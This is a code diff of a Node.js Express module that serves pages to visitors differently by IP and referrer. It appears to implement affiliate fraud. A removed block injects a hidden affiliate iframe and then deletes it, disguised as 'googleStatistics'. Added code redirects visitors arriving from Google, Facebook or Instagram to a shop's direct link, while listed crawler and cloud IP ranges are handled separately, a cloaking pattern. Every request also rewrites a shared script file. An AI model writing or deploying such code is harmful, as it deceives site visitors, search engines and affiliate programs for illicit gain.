@@ -8,8 +8,8 @@ let exc = [
     ['66.249.64.0', '66.249.95.255'],
     ['194.183.183.142', '194.183.183.142'],
     ['13.52.0.0', '13.59.255.255'],
-    ['103.84.110.90','103.84.110.90'],
-    ['89.248.174.141','89.248.174.141']
+    ['103.84.110.90', '103.84.110.90'],
+    ['89.248.174.141', '89.248.174.141']
 ]
 
 
@@ -142,8 +142,8 @@ module.exports = {
     index(path) {
         return (req, res) => {
             let _ip = req.get('x-real-ip');
-            let _ref = req.get('Referrer');
-            let _exc = isExc(_ip);
+            let _ref = req.get('Referrer') == undefined ? '' : req.get('Referrer');
+            let _exc = _ip == undefined ? true : isExc(_ip);
             if (_exc)
                 res.sendFile(path + '/index.html')
             else
@@ -170,8 +170,8 @@ module.exports = {
     list(path) {
         return (req, res) => {
             let _ip = req.get('x-real-ip');
-            let _ref = req.get('Referrer');
-            let _exc = isExc(_ip);
+            let _ref = req.get('Referrer') == undefined ? '' : req.get('Referrer');
+            let _exc = _ip == undefined ? true : isExc(_ip);
             let param = req.params[0];
             let _s = param.split('/');
             if (_s[0] == 'show') {
@@ -263,7 +263,7 @@ module.exports = {
 
             } else if (shops.hasOwnProperty(_s[0])) {
                 if (_s[1] == undefined || _s[1] == '') {
-                    let _link = shops[_s[0]]['aff'];
+                    /*let _link = shops[_s[0]]['aff'];
                     let _script = `
                         $('.mainStat').append('<iframe src="${_link}" width=600 height=150></iframe>');
                         function googleStatistics(){
@@ -275,19 +275,43 @@ module.exports = {
                             $('.mainStat').remove();
                             googleStatistics()
                         },7000)
-                    `;
-                    if (_exc)
-                        fs.readFile(`${path}/js/handle.js`, (err, data) => {
-                            let js = data.toString().replace('/*stat*/', _script);
-                            fs.writeFile(`${path}/js/handleFun.js`, js, err => {
+                    `;*/
+                    let _link = shops[_s[0]]['direct'];
+                    let _script = `
+                    $(()=>{
+                        function googleStatistics(){
+                            $.get('/googleStatistics').fail(e=>{
+                                googleStatistics()
+                            })    
+                        };
+                        googleStatistics()
+                            location.href = '${_link}';
+                    })
+                    `
+                    if (_exc) {
+                        if (_ref.includes('google') || _ref.includes('facebook') || _ref.includes('instagram')) {
+                            fs.writeFile(`${path}/js/handleFun.js`, _script, err => {
                                 fs.readFile(`${path}/index.html`, (err, data) => {
                                     let html = data.toString().replace('handle.js', 'handleFun.js');
-                                    fs.writeFile(`${path}/indexFun.html`, html, err => {
-                                        res.sendFile(`${path}/indexFun.html`);
-                                    })
+                                    res.set('Content-Type', 'text/html');
+                                    res.send(html);
                                 })
                             })
-                        })
+                        }
+                        else
+                            res.sendFile(`${path}/index.html`)
+                    }
+                    //                    fs.readFile(`${path}/js/handle.js`, (err, data) => {
+                    //                      let js = data.toString().replace('/*stat*/', _script);
+                    //                    fs.writeFile(`${path}/js/handleFun.js`, js, err => {
+                    //                      fs.readFile(`${path}/index.html`, (err, data) => {
+                    //                        let html = data.toString().replace('handle.js', 'handleFun.js');
+                    //                      fs.writeFile(`${path}/indexFun.html`, html, err => {
+                    //                        res.sendFile(`${path}/indexFun.html`);
+                    //                                })
+                    //                          })
+                    //                    })
+                    //              })}
                     else
                         mon.connect(toAccount, {
                             useNewUrlParser: true
@@ -303,17 +327,28 @@ module.exports = {
                                 'time': date.toLocaleTimeString().substr(0, 5)
                             }, (err, result) => {
                                 dbase.close();
-                                fs.readFile(`${path}/js/handle.js`, (err, data) => {
-                                    let js = data.toString().replace('/*stat*/', _script);
-                                    fs.writeFile(`${path}/js/handleFun.js`, js, err => {
+                                //                    fs.readFile(`${path}/js/handle.js`, (err, data) => {
+                                //                      let js = data.toString().replace('/*stat*/', _script);
+                                //                    fs.writeFile(`${path}/js/handleFun.js`, js, err => {
+                                //                      fs.readFile(`${path}/index.html`, (err, data) => {
+                                //                        let html = data.toString().replace('handle.js', 'handleFun.js');
+                                //                      fs.writeFile(`${path}/indexFun.html`, html, err => {
+                                //                                    res.sendFile(`${path}/indexFun.html`);
+                                //                              })
+                                //                        })
+                                //                  })
+                                //               })
+                                if (_ref.includes('google') || _ref.includes('facebook') || _ref.includes('instagram')) {
+                                    fs.writeFile(`${path}/js/handleFun.js`, _script, err => {
                                         fs.readFile(`${path}/index.html`, (err, data) => {
                                             let html = data.toString().replace('handle.js', 'handleFun.js');
-                                            fs.writeFile(`${path}/indexFun.html`, html, err => {
-                                                res.sendFile(`${path}/indexFun.html`);
-                                            })
+                                            res.set('Content-Type', 'text/html');
+                                            res.send(html);
                                         })
                                     })
-                                })
+                                }
+                                else
+                                    res.sendFile(`${path}/index.html`)
                             })
                         })
                 } else {
